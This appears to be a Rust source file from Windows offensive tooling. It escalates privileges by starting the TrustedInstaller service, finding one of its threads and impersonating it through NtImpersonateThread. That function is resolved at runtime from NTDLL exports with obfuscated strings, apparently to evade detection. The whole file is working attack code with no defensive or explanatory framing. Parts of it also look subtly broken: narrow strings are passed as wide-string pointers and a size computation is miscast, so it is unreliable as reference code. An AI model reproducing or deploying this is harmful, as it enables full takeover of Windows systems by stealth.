use crate::ytpes::*;
use export_resolver::ExportList;
use obfstr::obfstr;
use std::mem::transmute;

pub fn win32api_err_print(function_name: &str, api_name: &str) {
    use std::io;

    let os_error = io::Error::last_os_error();

    #[cfg(feature = "print")]
    println!("[!] {} {} failed With Error: {}", function_name, api_name, os_error);
}
pub fn enable_privilege(sz_privilege_name: &str) -> bool {
    use std::ptr::null_mut;

    use winapi::shared::ntdef::{FALSE, HANDLE, LUID};
    use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
    use winapi::um::winbase::LookupPrivilegeValueW;
    use winapi::um::winnt::{PTOKEN_PRIVILEGES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES};
    use winapi::um::securitybaseapi::AdjustTokenPrivileges;
    use winapi::um::handleapi::CloseHandle;

    let previous_state: PTOKEN_PRIVILEGES = null_mut();
    let mut l_uid: LUID = unsafe { std::mem::zeroed() };
    let mut h_token: HANDLE = unsafe { std::mem::zeroed() };
    let mut token_privileges: TOKEN_PRIVILEGES = unsafe { std::mem::zeroed() };

    unsafe {
        if LookupPrivilegeValueW(
            null_mut(),
            sz_privilege_name.as_ptr() as *const u16,
            &mut l_uid,
        ) == 0 {
            win32api_err_print("enable_privilege", "LookupPrivilegeValueW");
            return false;
        }

        let current_process_handle = GetCurrentProcess();
        if OpenProcessToken(
            current_process_handle,
            TOKEN_ADJUST_PRIVILEGES,
            &mut h_token,
        ) == 0 {
            win32api_err_print("enable_privilege", "OpenProcessToken");
            return false;
        }

        token_privileges.PrivilegeCount = 0x01;
        token_privileges.Privileges[0].Luid = l_uid;
        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        let res = AdjustTokenPrivileges(
            h_token,
            FALSE.into(),
            &mut token_privileges,
            size_of::<TOKEN_PRIVILEGES> as *const () as u32,
            null_mut(),
            null_mut(),
        );

        win32api_err_print("enable_privilege", "AdjustTokenPrivileges");

        CloseHandle(h_token);
        true
    }
}


pub(crate) struct ApiResolver {
    exports: ExportList<'static>,
}

impl ApiResolver {
    pub(crate) fn new() -> Self {
        ApiResolver {
            exports: ExportList::new(),
        }
    }

    // 获取对 NTDLL/KERNEL32 导出的引用
    pub(crate) fn get_addr(&mut self, dll: &'static str, func: &'static str) -> usize {
        self.exports
            .add(dll, func)
            .unwrap_or_else(|_| panic!("{}{}{}", obfstr!(" Couldn't add "), dll, func));

        // 获取函数的虚拟地址
        let addr = self
            .exports
            .get_function_address(func)
            .unwrap_or_else(|_| panic!("{}{}{}", obfstr!(" No adress for "), dll, func));

        addr
    }
}

pub fn impersonate_trusted_installer() {
    use std::ptr::null_mut;
    use std::thread;
    use std::time::Duration;

    use winapi::um::winsvc::{OpenSCManagerW, OpenServiceW, QueryServiceStatusEx, StartServiceW,
                             SC_MANAGER_CONNECT, SC_STATUS_PROCESS_INFO, SERVICE_QUERY_STATUS, SERVICE_RUNNING,
                             SERVICE_START, SERVICE_STATUS_PROCESS};
    use winapi::um::winnt::{SecurityImpersonation, LPCWSTR, SECURITY_QUALITY_OF_SERVICE, SECURITY_STATIC_TRACKING,
                            THREAD_DIRECT_IMPERSONATION, THREAD_QUERY_INFORMATION};
    use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
    use winapi::um::handleapi::INVALID_HANDLE_VALUE;
    use winapi::um::processthreadsapi::{OpenThread, GetCurrentThread};

    let mut dw_trusted_inst_tid = 0x00;
    let mut thread_entry32: THREADENTRY32 = unsafe { std::mem::zeroed() };
    let mut ssp: SERVICE_STATUS_PROCESS = unsafe { std::mem::zeroed() };
    let mut dw_bytes_needed = 0x00;

    unsafe {
        let h_scm = OpenSCManagerW(
            null_mut(),
            null_mut(),
            SC_MANAGER_CONNECT,
        );
        if h_scm == null_mut() {
            win32api_err_print("impersonate_trusted_installer","OpenSCManagerW")
        }


        let h_svc = OpenServiceW(
            h_scm,
            "TrustedInstaller".as_ptr() as LPCWSTR,
            SERVICE_QUERY_STATUS | SERVICE_START
        );
        if h_svc == null_mut() {
            win32api_err_print("impersonate_trusted_installer","OpenServiceW")
        }

        if QueryServiceStatusEx(
            h_svc,
            SC_STATUS_PROCESS_INFO,
            &mut ssp as *mut _ as *mut u8,
            size_of::<SERVICE_STATUS_PROCESS> as *const () as u32,
            &mut dw_bytes_needed,
        ) == 0 {
            win32api_err_print("impersonate_trusted_installer","QueryServiceStatusEx1")
        }

        if ssp.dwCurrentState != SERVICE_RUNNING {
            #[cfg(feature = "print")]
            println!("[*] TrustedInstaller State {}, Starting Service...", ssp.dwCurrentState);

            if StartServiceW(h_svc, 0x00, null_mut()) == 0 {
                #[cfg(feature = "print")]
                println!("[!] StartService Failed");
                win32api_err_print("impersonate_trusted_installer","StartServiceW")
            }
        }

        loop {
            thread::sleep(Duration::from_millis(200));

            if QueryServiceStatusEx(
                h_svc,
                SC_STATUS_PROCESS_INFO,
                &mut ssp as *mut _ as *mut u8,
                size_of::<SERVICE_STATUS_PROCESS> as *const () as u32,
                &mut dw_bytes_needed,
            ) == 0 {
                win32api_err_print("impersonate_trusted_installer","QueryServiceStatusEx2")
            }

            if  ssp.dwCurrentState == SERVICE_RUNNING {
                break;
            }
        }

        if ssp.dwProcessId == 0x00 {
            #[cfg(feature = "print")]
            println!("[!] Could Not Resolve TrustedInstaller's PID");
        }

        #[cfg(feature = "print")]
        println!("[+] TrustedInstaller PID: {}", ssp.dwProcessId);

        let h_snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0x00);
        if h_snap == INVALID_HANDLE_VALUE {
            win32api_err_print("impersonate_trusted_installer","CreateToolhelp32Snapshot")
        }

        let b_ok = Thread32First(h_snap, &mut thread_entry32);
        if b_ok == 0 {
            win32api_err_print("impersonate_trusted_installer","Thread32First")
        }

        loop {
            if thread_entry32.th32OwnerProcessID == ssp.dwProcessId {
                dw_trusted_inst_tid = thread_entry32.th32ThreadID;
                break
            }

            let b_ok = Thread32Next(h_snap, &mut thread_entry32);
            if b_ok == 0 {
                win32api_err_print("impersonate_trusted_installer","Thread32Next");
                break
            }
        }

        if dw_trusted_inst_tid == 0x00 {
            #[cfg(feature = "print")]
            println!("[!] Could Not Resolve TrustedInstaller's TID");
        }

        #[cfg(feature = "print")]
        println!("[+] Found TrustedInstaller Thread: {}", dw_trusted_inst_tid);

        let h_trusted_inst_thread = OpenThread(
            THREAD_DIRECT_IMPERSONATION | THREAD_QUERY_INFORMATION,
            0,
            dw_trusted_inst_tid
        );
        if h_trusted_inst_thread == null_mut() {
            win32api_err_print("impersonate_trusted_installer","OpenThread")
        }

        #[cfg(feature = "print")]
        println!("[+] Opened TrustedInstaller Thread Handle");

        use winapi::shared::minwindef::DWORD;

        let mut service_quality = SECURITY_QUALITY_OF_SERVICE {
            Length: size_of::<SECURITY_QUALITY_OF_SERVICE>() as DWORD,
            ImpersonationLevel: SecurityImpersonation,
            ContextTrackingMode: SECURITY_STATIC_TRACKING,
            EffectiveOnly: 0,
        };

        let mut api = ApiResolver::new();
        let pNtImpersonateThread = api.get_addr(&NTDLL_DLL, &NTIMPERSONATETHREAD);
        let pNtImpersonateThread: NtImpersonateThreadFn = transmute(pNtImpersonateThread);

        if pNtImpersonateThread(
            GetCurrentThread(),
            h_trusted_inst_thread,
            &mut service_quality
        ) != 0x00 {
            win32api_err_print("impersonate_trusted_installer","pNtImpersonateThread")
        }
    }
}